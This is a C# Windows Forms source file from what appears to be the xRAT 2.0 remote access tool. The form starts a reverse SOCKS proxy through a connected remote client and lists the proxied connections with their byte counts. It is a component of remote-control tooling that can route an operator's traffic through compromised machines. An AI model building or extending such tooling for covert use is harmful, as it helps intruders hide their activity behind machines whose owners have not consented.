using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.ReverseProxy;

namespace xServer.Forms
{
    public partial class FrmReverseProxy : Form
    {
        public Client client { get; private set; }
        public ReverseProxyServer socksServer { get; private set; }
        private delegate void Invoky();

        public FrmReverseProxy(Client client)
        {
            InitializeComponent();
            this.client = client;
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString());
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                socksServer = new ReverseProxyServer();
                socksServer.onConnectionEstablished += socksServer_onConnectionEstablished;
                socksServer.onUpdateConnection += socksServer_onUpdateConnection;
                socksServer.StartServer(client, "0.0.0.0", (int)nudServerPort.Value);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                btnStop_Click(null, null);
            }
        }

        void socksServer_onUpdateConnection(ReverseProxyClient ProxyClient)
        {
            if (ProxyClient.ListItem != null)
            {
                this.Invoke(new Invoky(() =>
                {
                    lock (LvConnections)
                    {
                        string TotalReceivedStr = GetSizeStr(ProxyClient.LengthReceived);
                        string TotalSendStr = GetSizeStr(ProxyClient.LengthSended);

                        ProxyClient.ListItem.SubItems[0].Text = ProxyClient.TargetServer;
                        ProxyClient.ListItem.SubItems[1].Text = ProxyClient.TargetPort.ToString();

                        if (ProxyClient.ListItem.SubItems[2].Text != TotalReceivedStr)
                            ProxyClient.ListItem.SubItems[2].Text = TotalReceivedStr;

                        if (ProxyClient.ListItem.SubItems[3].Text != TotalSendStr)
                            ProxyClient.ListItem.SubItems[3].Text = TotalSendStr;



                        if (!ProxyClient.IsConnected)
                        {
                            LvConnections.Items.Remove(ProxyClient.ListItem);
                        }
                    }
                }));
            }
        }

        private string GetSizeStr(long Size)
        {
            if (Size > (1024 * 1024 * 1024))
                return (Size / (1024 * 1024 * 1024)) + "GB";

            if (Size > (1024 * 1024))
                return (Size / (1024 * 1024)) + "MB";

            if (Size > 1024)
                return (Size / 1024) + "KB";

            return Size + "B";
        }

        void socksServer_onConnectionEstablished(ReverseProxyClient ProxyClient)
        {
            if (ProxyClient.ListItem == null)
            {
                this.Invoke(new Invoky(() =>
                {
                    lock (LvConnections)
                    {
                        ProxyClient.ListItem = new ListViewItem(new string[]
                        {
                            ProxyClient.TargetServer,
                            ProxyClient.TargetPort.ToString(),
                            ProxyClient.LengthReceived / 1024 + "KB",
                            ProxyClient.LengthSended / 1024 + "KB",
                            ProxyClient.Type.ToString()
                        });
                        ProxyClient.ListItem.Tag = ProxyClient;
                        LvConnections.Items.Add(ProxyClient.ListItem);
                    }
                }));
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (socksServer != null)
                socksServer.Stop();

            try
            {
                socksServer.onConnectionEstablished -= socksServer_onConnectionEstablished;
                socksServer.onUpdateConnection -= socksServer_onUpdateConnection;
            }
            catch { }
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Stop the proxy server if still active
            btnStop_Click(null, null);
        }
    }
}